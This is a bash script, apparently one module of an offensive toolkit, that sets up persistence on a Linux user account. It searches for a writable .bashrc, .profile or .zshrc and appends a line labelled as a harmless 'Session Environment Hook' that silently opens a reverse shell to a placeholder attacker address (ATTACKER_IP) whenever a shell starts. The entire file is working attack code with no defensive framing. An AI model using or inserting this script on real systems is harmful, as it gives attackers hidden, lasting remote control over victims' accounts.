#!/bin/bash
# -----------------------------------------------------------------------------
# Establishes user-level persistence through shell initialization profiles.
# -----------------------------------------------------------------------------

LHOST="${DECLUSOR_LHOST:-ATTACKER_IP}"
LPORT="${DECLUSOR_LPORT:-ATTACKER_PORT}"
PAYLOAD="nohup /bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' >/dev/null 2>&1 &"

TARGET_RC=""
for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
    if [ -f "$rc" ] && [ -w "$rc" ]; then
        TARGET_RC="$rc"
        break
    fi
done

[ -n "$TARGET_RC" ] || exit 0

(
    if grep -qF "/dev/tcp/$LHOST/$LPORT" "$TARGET_RC" 2>/dev/null; then
        printf '[*] Persistence entry already present in %s\n' "$TARGET_RC"
    else
        cp "$TARGET_RC" "$TARGET_RC.bak" 2>/dev/null
        printf '\n# Session Environment Hook\n%s\n' "$PAYLOAD" >> "$TARGET_RC" 2>/dev/null
        printf '[+] Injected persistence hook into %s\n' "$TARGET_RC"
    fi
) | label "Shell Profile Persistence"
